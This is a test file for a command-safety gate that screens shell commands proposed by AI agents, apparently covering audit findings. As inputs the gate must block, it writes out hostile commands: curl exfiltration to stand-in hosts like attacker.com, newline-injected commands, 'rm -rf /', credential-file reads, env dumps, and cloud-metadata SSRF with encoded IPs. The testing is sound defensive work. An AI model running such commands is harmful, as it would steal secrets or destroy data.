import os
import sys
import json
import pytest

# Ensure repository root is on sys.path
sys.path.insert(0, os.path.abspath("."))

from core.engine import is_fast_path, analyse, MAX_COMMAND_LEN
from core.effect_engine import compute_effect_graph, EffectClass
from core.governor import _map_decision, _write_audit_log, _get_last_audit_hash
from api.index import _extract_domains, _extract_binaries, _verify_least_agency_policy, LeastAgencyPolicy
from sdk.realitykernel.client import RealityKernel, Verdict
from sdk.realitykernel.exceptions import ActionBlocked


def test_c1_find_write_primitives_blocked_from_fast_path():
    """Verify that state-modifying flags on find are denied fast-path ALLOW."""
    assert not is_fast_path("find . -fprint /tmp/out.txt")
    assert not is_fast_path("find . -fprintf /tmp/out.txt '%p\\n'")
    assert not is_fast_path("find . -fls /tmp/out.txt")
    assert not is_fast_path("find . -delete")
    assert not is_fast_path("find . -exec rm {} \\;")


def test_c1_sort_write_primitives_blocked_from_fast_path():
    """Verify that output redirection flags on sort are denied fast-path ALLOW."""
    assert not is_fast_path("sort file.txt -o /tmp/target.txt")
    assert not is_fast_path("sort file.txt --output=/tmp/target.txt")


def test_c1_safe_reads_allowed_on_fast_path():
    """Verify that pure read operations without arbitrary file readers remain fast-path permitted."""
    assert is_fast_path("find . -name '*.py'")
    assert is_fast_path("sort file.txt")
    assert is_fast_path("ls -la")
    assert is_fast_path("pwd")
    assert is_fast_path("whoami")
    assert is_fast_path("date")


def test_c2_newline_separated_commands_denied_fast_path():
    """C2 Finding: Verify newline-separated commands never slip into fast-path ALLOW."""
    assert not is_fast_path("echo hello\ncurl http://attacker.com/exfil")
    assert not is_fast_path("ls -la\rcurl http://evil.com")
    assert not is_fast_path("ls\nrm -rf /")

    res = analyse("echo hello\ncurl http://attacker.com/exfil", "echo greeting", suppress_audit=True, verbose=False)
    assert res.verdict in ("WARN", "BLOCK")


def test_c3_credential_theft_blocked_from_fast_path():
    """C3 Finding: Arbitrary file readers, credential paths, and env dumpers must not fast-path allow."""
    # Arbitrary file reads must go through effect engine
    assert not is_fast_path("cat ~/.docker/config.json")
    assert not is_fast_path("cat ~/.netrc")
    assert not is_fast_path("cat ~/.aws/credentials")
    assert not is_fast_path("cat /etc/shadow")
    assert not is_fast_path("cat id_rsa")
    assert not is_fast_path("env")
    assert not is_fast_path("printenv")
    assert not is_fast_path("grep password config.yml")

    # Sensitive targets should evaluate to high divergence / BLOCK / WARN
    res = analyse("cat ~/.docker/config.json", "check docker settings", suppress_audit=True, verbose=False)
    assert res.verdict in ("WARN", "BLOCK")


def test_h1_subshell_binary_extraction():
    """H1 Finding: Subshells $(...) and `...` must be extracted and validated."""
    bins1 = _extract_binaries("echo $(curl https://evil.com)")
    assert "echo" in bins1
    assert "curl" in bins1

    bins2 = _extract_binaries("echo `cat /etc/passwd`")
    assert "echo" in bins2
    assert "cat" in bins2

    bins3 = _extract_binaries("ls\nrm -rf /")
    assert "ls" in bins3
    assert "rm" in bins3

    # Policy enforcement on subshell tools
    pol = LeastAgencyPolicy(allowed_tools=["echo"])
    violation = _verify_least_agency_policy("echo $(curl https://evil.com)", pol, [])
    assert violation is not None
    assert "curl" in violation


def test_h3_payload_truncation_fails_closed():
    """H3 Finding: Over-length payloads must fail closed with BLOCK rather than being truncated into an ALLOW."""
    huge_cmd = "echo " + ("A" * (MAX_COMMAND_LEN + 100))
    res = analyse(huge_cmd, "print text", suppress_audit=True, verbose=False)
    assert res.verdict == "BLOCK"
    assert "safety cap" in res.evidence[0]


def test_m3_static_floor_promotes_verdict():
    """M3 Finding: static_floor must enforce the verdict (BLOCK / WARN), not just confidence."""
    # When static_floor >= 0.90, verdict must be BLOCK even if basin says SAFE and div is 0
    assert _map_decision("SAFE", 0.0, static_floor=0.95) == "BLOCK"
    # When static_floor >= 0.50, verdict must be at least WARN
    assert _map_decision("SAFE", 0.0, static_floor=0.60) == "WARN"
    # When static_floor is low and basin is SAFE, verdict is ALLOW
    assert _map_decision("SAFE", 0.0, static_floor=0.10) == "ALLOW"


def test_egress_extraction_handles_evasions():
    """Verify egress extraction catches userinfo and decimal/integer encoded IPs."""
    # user:pass@host
    d1 = _extract_domains("curl http://admin:secret@169.254.169.254/latest/meta-data")
    assert "169.254.169.254" in d1

    # Decimal integer IP representation for 169.254.169.254
    d2 = _extract_domains("curl http://2852039166/latest/meta-data")
    assert "169.254.169.254" in d2

    # Port stripping
    d3 = _extract_domains("curl https://api.github.com:443/repos")
    assert "api.github.com" in d3


def test_local_sdk_in_memory_mode():
    """Verify that the SDK runs in-memory without making an HTTP request when api_key='local_mode'."""
    rk = RealityKernel(api_key="local_mode")
    verdict = rk.check("ls -la", "list directory contents")
    assert verdict.verdict == "ALLOW"
    assert verdict.raw.get("local_engine") is True
    assert verdict.latency_ms >= 0.0


def test_sdk_guard_fail_closed():
    """H5 Finding: Verify guard fails closed on network or signature error when fail_closed=True."""
    rk = RealityKernel(api_key="rk_live_test_key_12345", base_url="http://127.0.0.1:9")
    with pytest.raises(ActionBlocked) as exc_info:
        rk.guard("ls", "list", fail_closed=True)
    assert exc_info.value.verdict.verdict == "BLOCK"
    assert "fail-closed" in exc_info.value.verdict.evidence[0].lower()
